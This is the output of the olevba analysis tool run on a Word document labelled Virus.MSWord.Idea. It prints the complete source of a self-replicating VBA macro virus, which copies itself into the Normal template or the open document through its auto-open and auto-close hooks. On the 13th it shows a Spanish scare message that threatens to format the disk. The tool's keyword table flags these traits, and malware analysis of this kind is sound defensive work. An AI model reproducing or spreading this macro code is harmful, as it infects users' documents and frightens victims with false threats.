olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Idea
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Idea - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FuckViruZ.bas 
in file: Virus.MSWord.Idea - OLE stream: 'Macros/VBA/FuckViruZ'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoexit()
FuckViruZ
End Sub
Sub AutoOpen()
FuckViruZ
End Sub
Sub AutoClose()
FuckViruZ
End Sub
Private Sub FuckViruZ()
On Error Resume Next
Application.VBE.ActiveVBProject.VBComponents("FuckViruZ").Export "c:\FuckViruZ.sys"
 For i = 1 To NormalTemplate.VBProject.VBComponents.Count

If NormalTemplate.VBProject.VBComponents(i).Name = "FuckViruZ" Then norminstall = True
Next i
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
     If ActiveDocument.VBProject.VBComponents(i).Name = "FuckViruZ" Then activinstall = True
Next i

If activinstall = True And norminstall = False Then Set dobj = NormalTemplate.VBProject _
Else: If activinstall = False And norminstall = True Then Set dobj = ActiveDocument.VBProject
dobj.VBComponents.import ("c:\FuckViruZ.sys")
fecha
End Sub
Private Sub fecha()
If Day(Now()) = 13 Then MsgBox "Este es el MacroViruZ The Fucker..... >:-P jijijijijij si quieres la cura para este MacroViruZ.... jejeje contactate con nosotros.... en :P  FuckSoft producto  The Fucker SuperViruZ... al email BlackViruz@666.hell o al telf. de FuckSoft 666-666-666 llamar antes de que su HHDD sea formateado!!!!!!!!!! si cierra esta ventana su disco duro entrara en el proceso de formateado.         adios y buena suerte...                                                 gracias a hacker antiviruz por la idea :P"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |autoexit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

